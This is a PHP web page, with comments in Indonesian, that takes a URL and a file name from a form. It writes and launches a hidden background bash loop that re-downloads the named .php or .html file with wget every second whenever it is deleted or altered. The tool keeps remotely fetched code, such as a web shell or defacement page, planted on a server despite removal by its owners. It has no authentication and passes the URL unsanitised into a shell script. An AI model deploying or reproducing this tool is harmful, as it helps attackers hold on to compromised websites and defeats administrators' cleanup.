<?php
// Fungsi untuk membuat bash script yang akan menjalankan wget setiap detik jika file terhapus atau diubah
function setupBashScript($url, $fileName) {
    // Mendapatkan path direktori tempat script diletakkan
    $currentDir = __DIR__;
    
    // Pastikan direktori tujuan memiliki hak akses yang benar
    if (!is_writable($currentDir)) {
        echo "Direktori tidak dapat ditulisi. Pastikan memiliki hak akses tulis.";
        return;
    }
    
    // Membuat bash script untuk menjalankan wget setiap detik jika file terhapus atau kontennya berubah
    $bashScript = "#!/bin/bash\n"
                 . "originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')\n"
                 . "while true; do\n"
                 . "  if [ ! -f '$currentDir/$fileName' ]; then\n"
                 . "    echo 'File $fileName tidak ditemukan. Mendownload...' >> /tmp/wget_script.log\n"
                 . "    /usr/bin/wget -O '$currentDir/$fileName' '$url' > /dev/null 2>&1\n"
                 . "    originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')\n"
                 . "  else\n"
                 . "    currentHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')\n"
                 . "    if [ \"\$originalHash\" != \"\$currentHash\" ]; then\n"
                 . "      echo 'File $fileName telah diubah. Mengembalikan ke versi asli...' >> /tmp/wget_script.log\n"
                 . "      /usr/bin/wget -O '$currentDir/$fileName' '$url' > /dev/null 2>&1\n"
                 . "      originalHash=\$(md5sum $currentDir/$fileName | awk '{print \$1}')\n"
                 . "    else\n"
                 . "      echo 'File $fileName tidak berubah. Tidak mendownload ulang.' >> /tmp/wget_script.log\n"
                 . "    fi\n"
                 . "  fi\n"
                 . "  sleep 1\n"
                 . "done";

    // Simpan bash script di direktori temporer
    $bashFilePath = "/tmp/wget_script_$fileName.sh";
    file_put_contents($bashFilePath, $bashScript);

    // Memberi izin eksekusi ke bash script
    chmod($bashFilePath, 0755);

    // Menjalankan bash script di latar belakang menggunakan nohup
    exec("nohup bash $bashFilePath > /dev/null 2>&1 &");

    echo "Bash script telah dibuat untuk menjalankan wget setiap detik untuk URL: $url dan file: $fileName.\n";
}

// Fungsi untuk menghentikan bash script
function removeBashScript($fileName) {
    // Menghentikan semua proses wget_script yang berjalan di latar belakang
    exec("pkill -f wget_script_$fileName.sh");
    echo "Bash script dan proses wget untuk file $fileName dihentikan.\n";
}

// Jika pengguna menekan tombol "Start", jalankan bash script
if (isset($_POST['start'])) {
    $url = $_POST['url'];
    $fileName = $_POST['filename'];

    // Validasi nama file agar aman dan tidak merusak sistem
    if (preg_match('/^[a-zA-Z0-9_-]+\.(html|php)$/', $fileName)) {
        setupBashScript($url, $fileName);
    } else {
        echo "Nama file tidak valid. Harap gunakan karakter huruf, angka, underscore, atau dash, serta format .html atau .php";
    }
}

// Jika pengguna menekan tombol "Stop", hentikan bash script
if (isset($_POST['stop'])) {
    $fileName = $_POST['filename'];
    removeBashScript($fileName);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Wget File Creator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #4b79a1, #283e51);
            color: white;
            text-align: center;
            margin-top: 100px;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 8px;
            display: inline-block;
        }
        input[type="text"] {
            padding: 10px;
            border: none;
            border-radius: 4px;
            margin: 10px;
            width: 300px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            border: none;
            background-color: #4CAF50;
            color: white;
            border-radius: 4px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Simple Wget File Creator</h1>
        <p>Masukkan URL dan nama file yang ingin dibuat:</p>
        <form method="post">
            <input type="text" name="url" placeholder="Masukkan URL" required>
            <br>
            <input type="text" name="filename" placeholder="Masukkan nama file (contoh: myfile.html atau script.php)" required>
            <br>
            <input type="submit" name="start" value="Start">
            <input type="submit" name="stop" value="Stop">
        </form>
    </div>
</body>
</html>
